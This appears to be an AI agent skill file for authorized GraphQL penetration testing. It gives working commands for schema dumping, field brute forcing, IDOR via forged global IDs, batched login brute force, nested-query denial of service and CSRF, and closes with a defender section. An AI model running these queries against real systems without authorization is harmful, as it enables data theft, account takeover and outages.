---
name: graphql-security
description: Use when testing a GraphQL API on an authorized engagement.
  Covers finding the endpoint, abusing introspection for full schema
  dumps, enumerating queries and mutations, authorization testing on
  every field, batching attacks for brute force, nested query denial of
  service, IDOR through global IDs, and subscription abuse. Use when an
  app exposes /graphql or /api/graphql, when introspection is enabled in
  production, or when a single endpoint serves all data operations and
  needs field-level access control review.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [api-security-testing, webapp-pentest-methodology, auth-attacks]
tools:
  - name: Python
    version: "3.12"
  - name: Burp Suite
    version: "2026.2"
---

GraphQL exposes a typed schema of everything the API can do, and many
deployments leave introspection on and authorization checks off
individual fields. This skill covers the full authorized methodology:
finding the endpoint, dumping the schema, testing every query and
mutation for access control, and abusing batching and nesting. All
testing targets systems you have written permission to test.

## Quick Workflow

1. Find the GraphQL endpoint: `/graphql`, `/api/graphql`, `/v1/graphql`,
   or a path found in JS bundles.
2. Test introspection; if enabled, dump the full schema.
3. If introspection is off, brute force field names from the JS bundle
   and common wordlists.
4. Enumerate every query and mutation, noting arguments and types.
5. Test authorization on each field: unauthenticated access, horizontal
   IDOR, and vertical privilege escalation.
6. Test batching for brute force and rate-limit bypass.
7. Test nested queries for denial of service and cost-limit bypass.
8. Record the schema, the vulnerable fields, and the exact queries used.

## 1. Finding the endpoint

```bash
# Common paths, one quick sweep
for p in graphql api/graphql v1/graphql graphiql playground query; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST "https://target.example/$p" \
    -H 'Content-Type: application/json' \
    -d '{"query":"{__typename}"}')
  echo "/$p -> $code"
done
```

```bash
# GraphQL references hide in JS bundles: search them
curl -s 'https://target.example/static/app.js' | grep -o -E '/[a-zA-Z0-9/_-]*graphql[a-zA-Z0-9/_-]*' | sort -u | head -10
```

```bash
# Confirm it is GraphQL with a minimal query
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# Expect: {"data":{"__typename":"Query"}}
```

Also try GET with `?query={__typename}`; some servers accept both.

## 2. Introspection and schema dump

```bash
# Full introspection query (standard __schema dump)
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{name kind ofType{name kind}}}}}}}}"}' \
  -o /tmp/schema.json
python3 -c "
import json
s = json.load(open('/tmp/schema.json'))
types = s['data']['__schema']['types']
print(len(types), 'types found')
print([t['name'] for t in types if t['name'] and not t['name'].startswith('__')][:40])"
```

If full introspection is blocked, try field-by-field probing, which is
rarely disabled:

```bash
# __type probing works even when __schema is blocked on some servers
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"User\"){fields{name}}}"}' | head -c 400
```

When introspection is fully off, extract the schema from the client:
GraphQL clients often ship a persisted query map or the schema in the
bundle. Search JS for `__typename`, `query `, and `mutation ` strings,
and use a field wordlist against suspected types.

```bash
# Brute force field names on a type you suspect exists
for field in id email username password role admin isAdmin token secret; do
  r=$(curl -s -X POST 'https://target.example/graphql' \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{user(id:1){$field}}\"}")
  echo "$field: $(echo "$r" | head -c 80)"
done
```

## 3. Query and mutation enumeration

From the schema, list every operation and build a test matrix.

```bash
# List all queries and mutations with Python
python3 - <<'EOF'
import json
s = json.load(open('/tmp/schema.json'))['data']['__schema']
byname = {t['name']: t for t in s['types'] if t.get('name')}
for root in ('queryType', 'mutationType'):
    tname = s[root]['name']
    print('##', root, '->', tname)
    for f in (byname[tname].get('fields') or []):
        args = ', '.join(a['name'] for a in (f.get('args') or []))
        print(' -', f['name'], '(' + args + ')')
EOF
```

Test every mutation even if the UI never calls it: `deleteUser`,
`promoteUser`, `resetPassword`, and debug mutations ship in production
schemas constantly. For each, test unauthenticated, low-privilege, and
cross-user calls.

```bash
# Example: try a sensitive mutation as a low-privilege user
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $LOWPRIV_TOKEN" \
  -d '{"query":"mutation{promoteUser(id:2){id role}}"}' | head -c 300
```

## 4. Authorization testing (field level)

GraphQL authorization fails field by field. A query can be allowed while
one nested field leaks everything.

```bash
# Horizontal IDOR: swap the id argument
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -d '{"query":"{user(id:1){email passwordHash}}"}' | head -c 300
# Repeat with id:2, id:3 ... do other users' fields come back?
```

```bash
# Nested traversal: reach related objects the UI never shows
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $LOWPRIV_TOKEN" \
  -d '{"query":"{me{organization{users{email role}}adminNotes}}"}' | head -c 500
```

```bash
# Introspection as an auth oracle: compare the schema returned
# anonymously vs authenticated; hidden types sometimes leak
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}' -o /tmp/schema-anon.json
diff <(python3 -c "import json;print('\n'.join(sorted(t['name'] for t in json.load(open('/tmp/schema.json'))['data']['__schema']['types'] if t['name']))") \
     <(python3 -c "import json;print('\n'.join(sorted(t['name'] for t in json.load(open('/tmp/schema-anon.json'))['data']['__schema']['types'] if t['name']))") | head -20
```

Test directives and fragments too: some servers check authorization on
the named query but not on the same fields reached through fragments
or `@include`.

## 5. Batching attacks

GraphQL batching runs many queries in one request, which defeats naive
rate limiting.

```bash
# Batch 50 login attempts in one HTTP request
python3 - <<'EOF'
import json, urllib.request
batch = [{"query": 'mutation{login(username:"admin",password:"%s"){token}}' % pw}
         for pw in ["password", "admin", "123456", "letmein", "qwerty"]]
req = urllib.request.Request("https://target.example/graphql",
    data=json.dumps(batch).encode(),
    headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req, timeout=30).getcode())
EOF
```

```bash
# Test whether batching bypasses rate limits: send one request with
# 100 operations and count how many were actually executed
# (check the response array length vs the limit policy)
```

Also test alias-based brute force inside a single query:

```graphql
{
  a1: login(username:"admin", password:"pw1") { token }
  a2: login(username:"admin", password:"pw2") { token }
}
```

If the server has no query cost analysis, one request can do the work
of hundreds.

## 6. Nested query denial of service

Deeply nested queries multiply database work exponentially.

```bash
# Measure first with a shallow query, then nest deeper and compare timing
# (use a test environment or explicit permission; stop at the first
#  sign of real degradation)
curl -s -o /dev/null -w 'shallow: %{time_total}s\n' \
  -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{users{posts{author{posts{title}}}}}"}'

# Circular nesting is the worst case: users -> friends -> users ...
curl -s -o /dev/null -w 'deep: %{time_total}s\n' -m 20 \
  -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{users{friends{friends{friends{friends{name}}}}}}}"}'
```

Report the timing difference and the nesting depth that caused it. Do
not run sustained load; one slow query proves the missing depth or cost
limit.

## 7. IDOR through global IDs

Relay-style schemas use opaque base64 global IDs (`dXNlcjox`). They are
not access control.

```bash
# Decode the global ID format
echo 'dXNlcjox' | base64 -d; echo
# Often "user:1" or "User:1". If so, forge IDs for other objects:
echo -n 'user:2' | base64
# Then query with the forged global ID
curl -s -X POST 'https://target.example/graphql' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $LOWPRIV_TOKEN" \
  -d '{"query":"{node(id:\"dXNlcjoy\"){... on User{email}}}"}' | head -c 300
```

Test the `node` interface broadly: it resolves any type by ID, so it is
the fastest path to cross-object reads.

## 8. Subscriptions and persisted queries

```bash
# Subscriptions (websockets): connect and see if auth is checked
# wscat -c wss://target.example/graphql -H "Authorization: Bearer $TOKEN"
# Try without the token too; some servers skip auth on the WS upgrade.
```

Persisted queries (hashed queries, `extensions.persistedQuery`): the
server allow-lists query hashes. Test whether you can register new
hashes, and whether the hash check can be bypassed by sending the full
query text anyway.

## Edge cases

- The endpoint requires GET with URL-encoded queries: adapt every POST
  example to `?query=...`.
- Introspection blocked but the schema leaks in error messages: send
  malformed queries and read the "did you mean" suggestions, which
  enumerate real field names.
- The server enforces query depth limits: test the exact limit, then
  test whether fragments or aliases reset the counter.
- Rate limiting counts HTTP requests, not operations: batching bypasses
  it by design; report operations-per-request as the finding.
- Field suggestions and error messages differ between roles: diff
  error output as an unauthenticated user versus admin to find hidden
  fields.
- GraphQL over websockets only: use wscat or a Python websocket
  client; the same auth tests apply once connected.

## Escalation

- Schema fully hidden: harvest it from the mobile app or JS bundle,
  then brute force remaining fields with a GraphQL wordlist.
- Authorization looks solid on queries: hammer the mutations, which
  get less review and often skip checks.
- Batching disabled: try alias stacking inside one query, which many
  "no batching" configs still allow.
- Depth limits present: pivot to wide queries (request every field of
  a huge type) or expensive computed fields; cost limits are about
  more than depth.
- Everything locked down: GraphQL CSRF is still possible when the
  endpoint accepts GET and cookies carry auth; test a cross-site GET
  query for state-changing mutations.

## Detection and defender view

Defenders see GraphQL abuse as introspection queries from unknown
clients, single requests carrying dozens of aliased operations,
deeply nested queries with high execution time, and field-level 403s
that suddenly stop (meaning the attacker found an unprotected path).
The durable fixes are disabling introspection in production, enforcing
authorization on every field resolver (not just top-level queries),
query cost and depth analysis, rate limiting by operation count rather
than HTTP request count, short allow-lists of persisted queries for
public clients, and treating global IDs as opaque but never as
authorization. Log resolver-level denials; a burst of them from one
client is active probing.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): API
  endpoint abuse.
- MITRE ATT&CK T1213 (Information from Information Repositories):
  schema and data harvesting.
- MITRE ATT&CK T1499 (Endpoint Denial of Service): nested query DoS.
- CWE-862 (Missing Authorization): field-level auth gaps.
- CWE-639 (Authorization Bypass Through User-Controlled Key): IDOR
  via IDs.
- CWE-770 (Allocation of Resources Without Limits or Throttling):
  batching and nesting DoS.
- CWE-200 (Exposure of Sensitive Information): introspection leaks.
- OWASP API Security Top 10 2023: API3 Broken Object Property Level
  Authorization, API4 Unrestricted Resource Consumption.
- GraphQL spec: introspection section.
- PortSwigger Web Security Academy: GraphQL labs and cheat sheet.
